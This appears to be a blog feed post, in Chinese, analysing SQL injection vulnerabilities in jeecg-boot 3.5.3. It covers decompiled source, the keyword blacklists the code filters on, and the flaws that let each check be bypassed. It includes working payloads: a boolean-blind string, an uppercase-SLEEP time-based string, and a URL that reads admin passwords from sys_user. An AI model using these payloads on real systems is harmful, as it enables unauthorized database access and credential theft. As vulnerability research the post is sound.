<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://follycat.github.io/</id>
    <title>follycat&apos;blog</title>
    <updated>2025-04-15T01:49:58.328Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://follycat.github.io/"/>
    <link rel="self" href="https://follycat.github.io/atom.xml"/>
    <subtitle>无聊ini</subtitle>
    <logo>https://follycat.github.io/images/avatar.png</logo>
    <icon>https://follycat.github.io/favicon.ico</icon>
    <rights>All rights reserved 2025, follycat&apos;blog</rights>
    <entry>
        <title type="html"><![CDATA[jeecgboot3.5.3版本各类sql注入漏洞代码分析]]></title>
        <id>https://follycat.github.io/post/JmT91EXeGR/</id>
        <link href="https://follycat.github.io/post/JmT91EXeGR/">
        </link>
        <updated>2025-04-15T01:48:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="jeecgboot353版本各类sql注入漏洞代码分析">jeecgboot3.5.3版本各类sql注入漏洞代码分析</h1>
<p>这篇文章主要分享在实际项目中各类SQL注入漏洞形成的原因，并且使用了较多企业使用的开源项目jeecg-boot为例子，从而进一步理解SQL注入漏洞是如何形成以及为什么会出现sql注入漏洞。</p>
<h2 id="jinmureport中的未授权sql注入布尔盲注">jinmureport中的未授权sql注入(布尔盲注)</h2>
<p>CVE-2023-42268以及CVE-2023-41543这俩个漏洞都是依赖这段防护代码进行绕过，并且jeecgboot中存在某些路由无需使用token进行身份检测，可以直接未授权拿到数据库。</p>
<p>这里取的是<code>/jeecg-boot/jmreport/show</code>接口，</p>
<p>首先，可以找到位于<code>org.jeecg.modules.jmreport.desreport.a.a</code>中的show方法。</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1743501943858-9fda7da7-2942-416b-b646-856efa5d43e8.png" alt="" loading="lazy"></figure>
<p>其造成漏洞的方法为POST访问的show方法</p>
<pre><code>    @PostMapping({&quot;/show&quot;})
    public Result&lt;?&gt; a(@RequestBody JSONObject var1) {
        String var2 = var1.getString(&quot;id&quot;);
        a.info(&quot;--------进入show方法-----------, id = &quot; + var2);

        try {
            String var3 = var1.getString(&quot;params&quot;);
            return this.jmReportDesignService.show(var2, var3, (List)null);
        } catch (Exception var4) {
            a.error(var4.getMessage(), var4);
            return Result.error(var4.getMessage());
        }
    }
</code></pre>
<p>这个方法获取了json数据中的id以及params这俩个参数，并将其放入<code>jmReportDesignService.show</code>中进行数据查询操作。</p>
<p>跟进show方法，找到实现这个接口的<code>org.jeecg.modules.jmreport.desreport.service.a.e</code>类中的show方法。</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1743502377210-f2bdb8f3-5cf7-4b98-8702-822e451f095b.png" alt="" loading="lazy"></figure>
<p>完整代码如下：</p>
<pre><code>    public Result&lt;JimuReport&gt; show(String id, String params, List&lt;String&gt; dbCode) {
        JSONObject var4 = new JSONObject();
        boolean var5 = false;
        if (org.jeecg.modules.jmreport.common.b.g.d(params)) {
            var4 = JSON.parseObject(params);
            var5 = &quot;1&quot;.equals(var4.getString(&quot;onlyPageData&quot;));
        }

        a.debug(&quot;============EXCEL JSON数据查询==========&quot;);
        JimuReport var6 = this.reportDao.get(id);
        String var7 = var6.getJsonStr();
        this.a(var4, var7);
        Map var8 = this.getDataById(var6, var4, var5, dbCode);
        this.a(var7, var8);
        var6.setDataList(var8);
        a.debug(&quot;====配置的json字符串===&quot; + var6.getJsonStr());
        var7 = ReportUtil.a(var8, var7);
        JSONObject var9 = (JSONObject)var8.get(&quot;replaceParams&quot;);
        var7 = ReportUtil.a(var7, var9);
        var6.setJsonStr(var7);
        RenderInfo var10 = new RenderInfo(var6);
        var10.setStrategyName(org.jeecg.modules.jmreport.desreport.render.a.a.b.class.getSimpleName());
        Result var11 = this.a(var10);
        ExpressUtil.a(var11);
        return var11;
    }
</code></pre>
<p>看到<code>json</code>查询部分，这部分代码主要是进行参数的查询以及数据的返回，其中造成漏洞的参数为<code>params</code>参数，所以重点看到<code>getDataById</code>这个方法。</p>
<pre><code>    public Map&lt;String, Object&gt; getDataById(JimuReport report, JSONObject paramJson, boolean onlyPageData, List&lt;String&gt; excelDbcode) {
        HashMap var5 = new HashMap(5);
        if (report == null) {
            return var5;
        } else {
            JSONObject var6 = new JSONObject();
            var6.putAll(paramJson);
            List var7 = this.reportDbDao.selectList(report.getId());
            if (var7 == null) {
                return var5;
            } else {
                String var8 = &quot;&quot;;
                JSONObject var9 = JSONObject.parseObject(report.getJsonStr());
                JSONArray var10 = null;
                ArrayList var11 = new ArrayList();
                if (var9 != null) {
                    if (var9.containsKey(&quot;groupField&quot;) &amp;&amp; var9.containsKey(&quot;isGroup&quot;)) {
                        var8 = var9.getString(&quot;groupField&quot;);
                    }

                    var10 = var9.getJSONArray(&quot;dbexps&quot;);
                }

                if (var10 != null &amp;&amp; var10.size() &gt; 0) {
                    for(int var12 = 0; var12 &lt; var10.size(); ++var12) {
                        String var13 = var10.getString(var12);
                        JmExpression var14 = new JmExpression(var13);
                        var11.add(var14);
                    }
                }

                String var48 = paramJson.getString(&quot;printAll&quot;);
                var7 = this.c(var7);
                HashMap var49 = new HashMap(5);
                JSONObject var50 = org.jeecg.modules.jmreport.common.b.g.a(paramJson);
                Map var15 = this.a(var7, paramJson);
                Iterator var16 = var7.iterator();

                while(true) {
                    JmReportDb var17;
                    do {
                        do {
                            if (!var16.hasNext()) {
                                Map var51 = JmExpression.getExpMapByList(var11);
                                var5.put(&quot;expData&quot;, var51);
                                var5.put(&quot;replaceParams&quot;, var6);
                                return var5;
                            }

                            var17 = (JmReportDb)var16.next();
                        } while(onlyPageData &amp;&amp; !&quot;1&quot;.equals(var17.getIsPage()));
                    } while(null != excelDbcode &amp;&amp; excelDbcode.size() &gt; 0 &amp;&amp; excelDbcode.contains(var17.getDbCode()));

                    Object var18 = new ArrayList();
                    String var19 = var17.getDbCode();
                    new JSONObject();
                    paramJson = org.jeecg.modules.jmreport.common.b.g.a(var50);
                    this.a((JmReportDb)var17, (Map)var49, (Map)var15);
                    this.a(paramJson, var6, var17);
                    this.a(paramJson, var19, var6, var17);
                    ReportDbInfo var21;
                    if (&quot;2&quot;.equals(var17.getDbType())) {
                        var21 = this.a((JmReportDb)var17, (JSONObject)paramJson, (List)var18);
                        var5.put(var19, var21);
                    }

                    String var28;
                    JSONObject var52;
                    String var65;
                    if (&quot;0&quot;.equals(var17.getDbType())) {
                        var52 = new JSONObject();
                        JSONObject var22 = (JSONObject)var15.get(&quot;shared_query_param&quot;);
                        JSONObject var23 = (JSONObject)var15.get(var19);
                        var52.putAll(var22);
                        var52.putAll(var23);
                        String var24 = this.getDbSql(var17, var52, paramJson, var11, var8);
                        a.info(&quot;------报表【&quot; + var19 + &quot;】，查询的sql: &quot; + var24);
                        String var25 = var17.getDbSource();
                        Integer var26 = org.jeecg.modules.jmreport.common.b.g.a(paramJson.get(&quot;pageSize&quot;), 10);
                        Integer var27 = org.jeecg.modules.jmreport.common.b.g.a(paramJson.get(&quot;pageNo&quot;), 1);
                        if (org.jeecg.modules.jmreport.common.b.g.c(var25) &amp;&amp; this.jmBaseConfig.getSaas() &amp;&amp; this.jmBaseConfig.getSafeMode() != null &amp;&amp; this.jmBaseConfig.getSafeMode()) {
                            throw new JimuReportException(&quot;安全模式下，不允许使用平台数据源（请配置数据源）！&quot;);
                        }

                        var28 = org.jeecg.modules.jmreport.desreport.util.f.e(var24);
                        ReportDbInfo var29;
                        List var30;
                        if (org.jeecg.modules.jmreport.common.b.g.d(var28)) {
                            var29 = new ReportDbInfo();
                            var30 = this.jmreportDynamicDbUtil.a(var25, var28);
                            if (org.jeecg.modules.jmreport.common.b.g.d(var30)) {
                                var30 = ReportUtil.a(var30);
                            }

                            var29.setList(var30);
                            var5.put(var19, var29);
                        } else if (this.jmReportDbSourceService.isNoSql(var25)) {
                            var29 = new ReportDbInfo();
                            var30 = this.jmreportNoSqlService.findList(var24, var25);
                            if (org.jeecg.modules.jmreport.common.b.g.d(var30)) {
                                var30 = ReportUtil.a(var30);
                            }

                            var29.setList(var30);
                            var5.put(var19, var29);
                        } else {
                            Object var67;
                            Object var69;
                            if (org.jeecg.modules.jmreport.common.b.g.d(var25)) {
                                a.info(&quot;------数据源 dbSourceKey:【&quot; + var25 + &quot;】&quot;);
                                if (org.jeecg.modules.jmreport.common.b.g.d(var48)) {
                                    var29 = new ReportDbInfo();
                                    var67 = new ArrayList();

                                    try {
                                        var67 = this.jmreportDynamicDbUtil.b(var25, var24, new Object[0]);
                                    } catch (Exception var47) {
                                        this.a(var47);
                                    }

                                    if (org.jeecg.modules.jmreport.common.b.g.d(var67)) {
                                        var67 = ReportUtil.a((List)var67);
                                    }

                                    var29.setList((List)var67);
                                    var5.put(var19, var29);
                                } else {
                                    var65 = org.jeecg.modules.jmreport.dyndb.util.b.e(var24);
                                    var67 = new HashMap(5);

                                    try {
                                        JmreportDynamicDataSourceVo var31 = org.jeecg.modules.jmreport.dyndb.a.a(var25);
                                        if (org.jeecg.modules.jmreport.common.b.g.c(var31.getDbUrl())) {
                                            throw new JimuReportException(&quot;数据源配置无效,请检查!&quot;);
                                        }

                                        if (&quot;sqlserver&quot;.equals(var31.getDbType().toLowerCase()) &amp;&amp; !var65.toUpperCase().contains(&quot;CONVERT&quot;)) {
                                            SqlServerParse var32 = new SqlServerParse();
                                            var65 = var32.removeOrderBy(var65);
                                        }

                                        var67 = (Map)this.jmreportDynamicDbUtil.a(var25, var65, new Object[0]);
                                    } catch (Exception var46) {
                                        this.a(var46);
                                    }

                                    int var66 = 1;
                                    var69 = ((Map)var67).get(&quot;total&quot;);
                                    int var33 = 0;
                                    if (var69 != null) {
                                        var33 = Integer.parseInt(var69.toString());
                                        double var34 = Double.parseDouble(var69.toString()) / (double)var26;
                                        var66 = (int)Math.ceil(var34);
                                    }

                                    List var72 = null;
                                    if (&quot;1&quot;.equals(var17.getIsPage())) {
                                        JmreportDynamicDataSourceVo var35 = org.jeecg.modules.jmreport.dyndb.a.a(var25);
                                        String var36 = MiniDaoUtil.createPageSql(var35.getDbUrl(), var24, var27, var26);

                                        try {
                                            var72 = this.jmreportDynamicDbUtil.b(var25, var36, new Object[0]);
                                        } catch (Exception var45) {
                                            a.warn(var45.getMessage(), var45);
                                            throw new JimuReportException(var45.getMessage());
                                        }
                                    } else {
                                        try {
                                            var72 = this.jmreportDynamicDbUtil.b(var25, var24, new Object[0]);
                                        } catch (Exception var44) {
                                            a.warn(var44.getMessage(), var44);
                                            throw new JimuReportException(var44.getMessage());
                                        }
                                    }

                                    ReportDbInfo var73 = new ReportDbInfo((long)var66, (long)var33, var17.getIsPage(), var17.getIsList(), var17.getDbType());
                                    if (org.jeecg.modules.jmreport.common.b.g.d(var72)) {
                                        var72 = ReportUtil.a(var72);
                                    }

                                    var73.setList(var72);
                                    var5.put(var19, var73);
                                }
                            } else if (org.jeecg.modules.jmreport.common.b.g.d(var48)) {
                                var29 = new ReportDbInfo();
                                var67 = new ArrayList();

                                try {
                                    var67 = this.reportDbDao.selectListBySql(var24);
                                } catch (Exception var43) {
                                    this.a(var43);
                                }

                                if (org.jeecg.modules.jmreport.common.b.g.d(var67)) {
                                    var67 = ReportUtil.a((List)var67);
                                }

                                var29.setList((List)var67);
                                var5.put(var19, var29);
                            } else {
                                var65 = var17.getIsPage();
                                String var74 = var17.getIsList();
                                if (&quot;0&quot;.equals(var65) || org.jeecg.modules.jmreport.common.b.g.c(var65)) {
                                    var27 = 1;
                                }

                                ReportDbInfo var68 = null;
                                if (&quot;1&quot;.equals(var65)) {
                                    MiniDaoPage var70 = new MiniDaoPage();

                                    try {
                                        var70 = this.reportDbDao.selectPageBySql(var24, var27, var26);
                                    } catch (Exception var42) {
                                        this.a(var42);
                                    }

                                    var68 = new ReportDbInfo((long)var70.getPages(), (long)var70.getTotal(), var65, var74, var17.getDbType());
                                    List var71 = var70.getResults();
                                    if (org.jeecg.modules.jmreport.common.b.g.d(var71)) {
                                        var71 = ReportUtil.a(var71);
                                    }

                                    var68.setList(var71);
                                } else {
                                    var69 = new ArrayList();

                                    try {
                                        var69 = this.reportDbDao.selectListBySql(var24);
                                    } catch (Exception var41) {
                                        this.a(var41);
                                    }

                                    if (var69 != null) {
                                        var68 = new ReportDbInfo(1L, (long)((List)var69).size(), var65, var74, var17.getDbType());
                                        if (org.jeecg.modules.jmreport.common.b.g.d(var69)) {
                                            var69 = ReportUtil.a((List)var69);
                                        }

                                        var68.setList((List)var69);
                                    }
                                }

                                var5.put(var19, var68);
                            }
                        }

                        var29 = (ReportDbInfo)var5.get(var19);
                        var30 = var29.getList();
                        var18 = org.jeecg.modules.jmreport.common.b.g.a(var30);
                        this.replaceDbCode(var17, var30);
                        var29.setList(var30);
                        var5.replace(var19, var29);
                    }

                    if (&quot;1&quot;.equals(var17.getDbType())) {
                        var52 = this.getApiRequestParams(var17, var15, var48, var8);
                        String var53 = this.jimuTokenClient.getToken();
                        Object var55 = new HashMap(5);

                        try {
                            var55 = this.getApiData(var17, var53, var52);
                        } catch (ResourceAccessException var38) {
                            throw new JimuReportException(&quot;api连接超时，请重试！&quot;);
                        } catch (JimuReportException var39) {
                            throw new JimuReportException(var39.getMessage());
                        } catch (Exception var40) {
                            a.warn(var40.getMessage(), var40);
                        }

                        ReportDbInfo var57 = new ReportDbInfo(var17.getIsPage(), var17.getIsList(), var17.getDbType());
                        Object var59 = ((Map)var55).get(&quot;dataList&quot;);
                        if (org.jeecg.modules.jmreport.common.b.g.d(var59)) {
                            var57.setList((List)var59);
                        }

                        if (org.jeecg.modules.jmreport.common.b.g.c(var48)) {
                            Object var61 = ((Map)var55).get(&quot;linkList&quot;);
                            if (org.jeecg.modules.jmreport.common.b.g.d(var61)) {
                                var57.setLinkList((List)var61);
                            }

                            var57.setTotal(org.jeecg.modules.jmreport.common.b.b.a(((Map)var55).get(&quot;total&quot;), 0L));
                            var57.setCount(org.jeecg.modules.jmreport.common.b.b.a(((Map)var55).get(&quot;count&quot;), 0L));
                        }

                        if (null != var57.getList()) {
                            List var62 = var57.getList();
                            var18 = org.jeecg.modules.jmreport.common.b.g.a(var62);
                            this.replaceDbCode(var17, var62);
                            var57.setList(var62);
                        }

                        var5.put(var19, var57);
                    }

                    if (&quot;3&quot;.equals(var17.getDbType())) {
                        var21 = this.a(var17, paramJson, var48, var19);
                        var18 = org.jeecg.modules.jmreport.common.b.g.a(var21.getList());
                        var5.put(var19, var21);
                    }

                    var21 = (ReportDbInfo)var5.get(var19);
                    List var54 = var21.getList();

                    for(int var56 = 0; var56 &lt; var54.size(); ++var56) {
                        Map var58 = (Map)var54.get(var56);
                        Iterator var60 = var58.keySet().iterator();

                        while(var60.hasNext()) {
                            String var63 = (String)var60.next();
                            Object var64 = var58.get(var63);
                            if (var64 != null) {
                                var28 = var64.toString();
                                if (var28.indexOf(&quot;\&quot;&quot;) &gt;= 0) {
                                    var65 = var28.replaceAll(&quot;\&quot;&quot;, &quot;“&quot;);
                                    var58.put(var63, var65);
                                }
                            }
                        }
                    }

                    this.a((JmReportDb)var17, (Map)var49, (List)var18);
                }
            }
        }
    }
</code></pre>
<p><code>getDataById</code>这个方法很长，这个方法的主要起到通过报表ID来获取报表数据的作用</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1743504913716-c418192f-3d57-4544-bca6-47f983a07c14.png" alt="" loading="lazy"></figure>
<p>继续跟进后会走到<code>getDbsql</code>中，这个方法是执行sql语句查询的方法。</p>
<p>进入到<code>getDbSql</code>方法，代码如下</p>
<pre><code>    public String getDbSql(JmReportDb reportDb, JSONObject paramObject, JSONObject paramJson, List&lt;JmExpression&gt; expList, String groupField) {
        String var6 = this.getBaseSql(reportDb, paramObject);
        i.a(var6);
        String var7 = this.a(reportDb, paramJson);
        this.a(reportDb, var6, var7, expList);
        String var8 = null;
        if (org.jeecg.modules.jmreport.common.b.g.d(groupField)) {
            String[] var9 = groupField.split(&quot;.&quot;);
            byte var10 = 2;
            if (var9.length == var10 &amp;&amp; reportDb.getDbCode().equals(var9[0])) {
                var8 = var9[1];
            }
        }

        String var11 = this.a(var6, var7, var8);
        return var11;
    }
</code></pre>
<p>这个方法主要进行sql数据的查询操作，其中包括了对sql语句的校验、过滤以及执行。</p>
<p>其中过滤操作位于<code>i.a</code>方法中，可以跟进该方法，以查看造成该漏洞的过滤代码。</p>
<pre><code>    public static void a(String var0) {
        String[] var1 = &quot; exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|&quot;.split(&quot;\\|&quot;);
        if (var0 != null &amp;&amp; !&quot;&quot;.equals(var0)) {
            b(var0);
            var0 = var0.toLowerCase();
            c(var0);
            var0 = var0.replaceAll(&quot;/\\*.*\\*/&quot;, &quot;&quot;);

            for(int var2 = 0; var2 &lt; var1.length; ++var2) {
                if (var0.indexOf(var1[var2]) &gt; -1 || var0.startsWith(var1[var2].trim())) {
                    a.error(&quot;请注意，存在SQL注入关键词---&gt; {}&quot;, var1[var2]);
                    a.error(&quot;请注意，值可能存在SQL注入风险!---&gt; {}&quot;, var0);
                    throw new JimuReportException(1001, &quot;请注意，值可能存在SQL注入风险!---&gt;&quot; + var0);
                }
            }

            if (Pattern.matches(&quot;show\\s+tables&quot;, var0) || Pattern.matches(&quot;user[\\s]*\\([\\s]*\\)&quot;, var0)) {
                throw new RuntimeException(&quot;请注意，值可能存在SQL注入风险!---&gt;&quot; + var0);
            }
        }
    }
</code></pre>
<p>可以看到其过滤的黑名单为<code>&quot; exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|&quot;;</code>，因为其过滤并不完全，没有过滤<code>ascii,having</code>等可以造成注入的代码，从而导致了布尔注入，由于这个路由的代码都没有身份校验，所以无需登录以及token即可完成注入。</p>
<p>exp:</p>
<pre><code>1 'having {ascii}=(nullif (ascii (substring ((select database()), {place}, 1)), 0) or'
</code></pre>
<h3 id="漏洞成因分析">漏洞成因分析</h3>
<p>这个漏洞的成因就是黑名单过滤不完全，从而导致了sql注入漏洞。</p>
<h3 id="漏洞修复">漏洞修复</h3>
<p>作者升级了积木报表的版本，并补全了黑名单。</p>
<h2 id="jeecgboot中的sql注入时间盲注">jeecgboot中的sql注入(时间盲注)</h2>
<p>这里分析选择的是<code>/sys/dict/loadTreeData</code>路由，位于<code>org/jeecg/modules/system/controller/SysDictController</code>类中</p>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744201013517-65210a3a-6181-4178-8d3c-c53915ef4119.png" alt="" loading="lazy"></figure>
<p>其完整代码如下：</p>
<pre><code>	@RequestMapping(value = &quot;/loadTreeData&quot;, method = RequestMethod.GET)
	public Result&lt;List&lt;TreeSelectModel&gt;&gt; loadTreeData(@RequestParam(name=&quot;pid&quot;,required = false) String pid,@RequestParam(name=&quot;pidField&quot;) String pidField,
												  @RequestParam(name=&quot;tableName&quot;) String tbname,
												  @RequestParam(name=&quot;text&quot;) String text,
												  @RequestParam(name=&quot;code&quot;) String code,
												  @RequestParam(name=&quot;hasChildField&quot;) String hasChildField,
												  @RequestParam(name=&quot;converIsLeafVal&quot;,defaultValue =&quot;1&quot;) int converIsLeafVal,
												  @RequestParam(name=&quot;condition&quot;) String condition,
												  @RequestParam(value = &quot;sign&quot;,required = false) String sign,HttpServletRequest request) {
		Result&lt;List&lt;TreeSelectModel&gt;&gt; result = new Result&lt;List&lt;TreeSelectModel&gt;&gt;();
		Map&lt;String, String&gt; query = null;
		if(oConvertUtils.isNotEmpty(condition)) {
			query = JSON.parseObject(condition, Map.class);
		}
		String dictCode = tbname+&quot;,&quot;+text+&quot;,&quot;+code+&quot;,&quot;+condition;
        SqlInjectionUtil.filterContent(dictCode);
		if(!dictQueryBlackListHandler.isPass(dictCode)){
			return result.error500(dictQueryBlackListHandler.getError());
		}
		List&lt;TreeSelectModel&gt; ls = sysDictService.queryTreeList(query,tbname, text, code, pidField, pid,hasChildField,converIsLeafVal);
		result.setSuccess(true);
		result.setResult(ls);
		return result;
	}
</code></pre>
<p>这段代码中sql校验的代码为<code>SqlInjectionUtil.filterContent(dictCode);</code>其他进行sql语句查询的方法也是用该方法进行校验的，所以跟进到<code>SqlInjectionUtil</code>类中的<code>filterContent</code>方法</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744201149141-17cb317a-1cae-4ad5-b4f0-e240928adf1b.png" alt="" loading="lazy"></figure>
<p>代码如下：</p>
<pre><code>public static void filterContent(String[] values) {
    filterContent(values, null);
}

/**
 * sql注入过滤处理，遇到注入关键字抛异常
 * 
 * @param values
 * @return
 */
public static void filterContent(String[] values, String customXssString) {
    String[] xssArr = XSS_STR.split(&quot;\\|&quot;);
    for (String value : values) {
        if (value == null || &quot;&quot;.equals(value)) {
            return;
        }
        // 校验sql注释 不允许有sql注释
        checkSqlAnnotation(value);
        // 统一转为小写
        value = value.toLowerCase();
        //SQL注入检测存在绕过风险 https://gitee.com/jeecg/jeecg-boot/issues/I4NZGE
        //value = value.replaceAll(&quot;/\\*.*\\*/&quot;,&quot;&quot;);

        for (int i = 0; i &lt; xssArr.length; i++) {
            if (value.indexOf(xssArr[i]) &gt; -1) {
                log.error(&quot;请注意，存在SQL注入关键词---&gt; {}&quot;, xssArr[i]);
                log.error(&quot;请注意，值可能存在SQL注入风险!---&gt; {}&quot;, value);
                throw new RuntimeException(&quot;请注意，值可能存在SQL注入风险!---&gt;&quot; + value);
            }
        }
        //update-begin-author:taoyan date:2022-7-13 for: 除了XSS_STR这些提前设置好的，还需要额外的校验比如 单引号
        if (customXssString != null) {
            String[] xssArr2 = customXssString.split(&quot;\\|&quot;);
            for (int i = 0; i &lt; xssArr2.length; i++) {
                if (value.indexOf(xssArr2[i]) &gt; -1) {
                    log.error(&quot;请注意，存在SQL注入关键词---&gt; {}&quot;, xssArr2[i]);
                    log.error(&quot;请注意，值可能存在SQL注入风险!---&gt; {}&quot;, value);
                    throw new RuntimeException(&quot;请注意，值可能存在SQL注入风险!---&gt;&quot; + value);
                }
            }
        }
        //update-end-author:taoyan date:2022-7-13 for: 除了XSS_STR这些提前设置好的，还需要额外的校验比如 单引号
        if(Pattern.matches(SHOW_TABLES, value) || Pattern.matches(REGULAR_EXPRE_USER, value)){
            throw new RuntimeException(&quot;请注意，值可能存在SQL注入风险!---&gt;&quot; + value);
        }
    }
    return;
}
</code></pre>
<p><code>fielterContent</code>方法是jeecgboot3.5.3版本中的检测sql语句是否安全的方法，基本上所有进行sql语句查询的方法都调用了这个方法，这个方法首先校验传入参数是否为空，然后进入到<code>checkSqlAnnotation</code>方法继续校验，跟进到<code>checkSqlAnnotation</code></p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744201305180-2a0e79a0-136c-4e90-8b5f-4b0acf0b7d7c.png" alt="" loading="lazy"></figure>
<p>代码如下：</p>
<pre><code>	public static void checkSqlAnnotation(String str){
		Matcher matcher = SQL_ANNOTATION.matcher(str);
		if(matcher.find()){
			String error = &quot;请注意，值可能存在SQL注入风险---&gt; \\*.*\\&quot;;
			log.error(error);
			throw new RuntimeException(error);
		}
		
		// issues/4737 sys/duplicate/check SQL注入 #4737
		Matcher sleepMatcher = FUN_SLEEP.matcher(str);
		if(sleepMatcher.find()){
			String error = &quot;请注意，值可能存在SQL注入风险---&gt; sleep&quot;;
			log.error(error);
			throw new RuntimeException(error);
		}
	}
</code></pre>
<p>这个方法首先校验了是否存在违规的字符，然后判断是否有sleep位于参数中。</p>
<p>仔细观察<code>filterContent</code>方法的逻辑，如图，他是先判断违规字符以及sleep是否存在于参数中，然后再进行小写转换的，所以当sleep为大写时，就可以绕过sleep。</p>
<figure data-type="image" tabindex="7"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744201347400-f1cb79b5-562e-4bab-a8bd-7e110bc6beb5.png" alt="" loading="lazy"></figure>
<p>这个漏洞还存在于</p>
<p>验证exp:parseSql路由以及其他使用sql查询的路由中</p>
<pre><code>(SELECT 6240 FROM (SELECT(SLEEP(5)) AND 1=1)vidl)
</code></pre>
<h3 id="漏洞成因分析-2">漏洞成因分析</h3>
<p>正则表达式不匹配不完全，或者代码逻辑错误，将sleep的匹配放到了将其转换为小写之前。</p>
<h3 id="漏洞修复-2">漏洞修复</h3>
<figure data-type="image" tabindex="8"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744362658217-03f11673-cfac-4666-821a-a3ea49f7f5e7.png" alt="" loading="lazy"></figure>
<p>作者对正则表达式进行了修改，让其不区分大小写进行匹配sleep。</p>
<h2 id="jeecgboot中的sql注入普通用户越权查询所有表的信息">jeecgboot中的sql注入(普通用户越权查询所有表的信息)</h2>
<p>这里分析的同样也是<code>/sys/dict/loadTreeData</code>路由，但造成漏洞的原因与上面的时间盲注漏洞并不相同，这个漏洞是由于没有对用户权限以及用户输入进行有效的过滤，从而导致普通用户可以直接查询到管理员用户的账号密码等信息。</p>
<p>之前在对<code>/sys/dict/loadTreeData</code>路由代码审计的过程中，以及审计完了验证sql语句安全的代码<code>SqlInjectionUtil.filterContent(dictCode);</code></p>
<p>接下来继续向下分析</p>
<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744359315853-cb31fe7c-6ffb-491a-a778-8e5104763c22.png" alt="" loading="lazy"></figure>
<p>可以看到有一个黑名单检测的操作，造成sql注入的代码就是这一段，继续跟进isPass方法，</p>
<figure data-type="image" tabindex="10"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744359669120-6df4fa26-6348-4b4d-9f8c-4796ce8cfbf6.png" alt="" loading="lazy"></figure>
<p>代码如下：</p>
<pre><code>public boolean isPass(String sql) {
List&lt;QueryTable&gt; list = null;
//【jeecg-boot/issues/4040】在线报表不支持子查询，解析报错 #4040
try {
    list = this.getQueryTableInfo(sql.toLowerCase());
} catch (Exception e) {
    log.warn(&quot;校验sql语句，解析报错：{}&quot;,e.getMessage());
}

if(list==null){
    return true;
}
log.info(&quot;--获取sql信息--&quot;, list.toString());
boolean flag = checkTableAndFieldsName(list);
if(flag == false){
    return false;
}
for (QueryTable table : list) {
    String name = table.getName();
    String fieldString = ruleMap.get(name);
    // 有没有配置这张表
    if (fieldString != null) {
        if (&quot;*&quot;.equals(fieldString) || table.isAll()) {
            flag = false;
            log.warn(&quot;sql黑名单校验，表【&quot;+name+&quot;】禁止查询&quot;);
            break;
        } else if (table.existSameField(fieldString)) {
            flag = false;
            break;
        }

    }
}
return flag;
}
</code></pre>
<p>这个方法通过解析传入的 SQL 语句，获取其中的表格信息，并根据规则检查表格和字段是否合法。如果 SQL 涉及的表或字段在黑名单中，则返回 <code>false</code>，否则返回 <code>true</code>。</p>
<p>首先，跟进<code>getQueryTableInfo</code>方法，来查看是如何解析sql语句的</p>
<figure data-type="image" tabindex="11"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744360529907-701ab08d-6874-496b-9c7b-532fb4baa862.png" alt="" loading="lazy"></figure>
<p>代码如下：</p>
<pre><code>public class DictQueryBlackListHandler extends AbstractQueryBlackListHandler {

    @Override
    protected List&lt;QueryTable&gt; getQueryTableInfo(String dictCodeString) {
        if (dictCodeString != null &amp;&amp; dictCodeString.indexOf(SymbolConstant.COMMA) &gt; 0) {
            String[] arr = dictCodeString.split(SymbolConstant.COMMA);
            if (arr.length != 3 &amp;&amp; arr.length != 4) {
                return null;
            }
            String tableName = getTableName(arr[0]);
            QueryTable table = new QueryTable(tableName, &quot;&quot;);
            // 无论什么场景 第二、三个元素一定是表的字段，直接add
            table.addField(arr[1].trim());
            String filed = arr[2].trim();
            if (oConvertUtils.isNotEmpty(filed)) {
                table.addField(filed);
            }
            List&lt;QueryTable&gt; list = new ArrayList&lt;&gt;();
            list.add(table);
            return list;
        }
        return null;
    }
</code></pre>
<p>这段代码首先，对字符串进行了检查与拆分，并判断差分字符串的数组长度是否符合预期的3或者4，然后使用<code>getTableName</code>方法来获取表的具体值，因此继续跟进到<code>getTableName</code>方法中。</p>
<figure data-type="image" tabindex="12"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744362177810-eb7cce3f-0413-456d-8143-353f6a552273.png" alt="" loading="lazy"></figure>
<p>代码如下:</p>
<pre><code>
    private String getTableName(String str) {
        String[] arr = str.split(&quot;\\s+(?i)where\\s+&quot;);
        // sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393
        String reg = &quot;\\s+|\\(|\\)|`&quot;;
        return arr[0].replaceAll(reg, &quot;&quot;);
    }
</code></pre>
<p>进入<code>getTableName</code>方法中可以发现其对sys这一类型的表进行了正则操作，以此来维护管理员账号以及密码的安全，但是其过滤并不完全，从而导致了该漏洞的产生。</p>
<p>只需要给表添加别名即可绕过</p>
<p>exp：</p>
<pre><code>http://localhost:8080/jeecg-boot/sys/dict/loadTreeData?tableName=sys_user t&amp;text=password,id&amp;code=password&amp;hasChildField=&amp;converIsLeafVal=1&amp;condition=&amp;pid=admin&amp;pidField=username
</code></pre>
<h3 id="漏洞成因分析-3">漏洞成因分析</h3>
<p>对于黑名单的表单正则匹配并不完全，导致出现越权查询漏洞。</p>
<h3 id="漏洞修复-3">漏洞修复</h3>
<p>这个漏洞进行了多次修复，其中包括去除前后空格如果表名包含数据库名（即 <code>.</code>），则去除数据库名部分。去除表名中的空格，使用正则表达式去除表名中的空格、括号和反引号等特殊字符。</p>
